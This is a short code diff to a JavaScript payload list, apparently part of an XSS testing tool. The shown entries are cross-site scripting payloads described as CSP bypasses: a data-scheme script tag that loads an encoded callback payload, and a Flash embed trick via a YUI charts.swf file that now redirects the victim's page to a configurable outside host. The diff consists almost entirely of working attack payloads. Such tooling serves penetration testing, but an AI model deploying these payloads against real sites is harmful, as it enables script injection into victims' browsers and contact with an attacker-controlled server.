@@ -142,11 +142,13 @@ exports.payloadList = config => {
       description: 'CSP Bypass - data scheme/wildcard in script-src ',
       payload: `"><script src=data:text/javascript;base64,${this.encodePayloadHttpInteraction(
         config
-      )}></script > `
+      )}></script> `
     },
     {
       description: 'CSP Bypass - Missing or relaxed object-src',
-      payload: `"><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\\"})))}catch (e) { d = document; d.location.hash.match(\`x1\`) ? \`\` : d.location=\`//localhost/mH\`}//' allowscriptaccess=always>`
+      payload: `"><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\\"})))}catch (e) { d = document; d.location.hash.match(\`x1\`) ? \`\` : d.location=\`//${
+        config.url
+      }/mH\`}//' allowscriptaccess=always>`
     },
     {
       description: 'Google Research - Vue.js ',
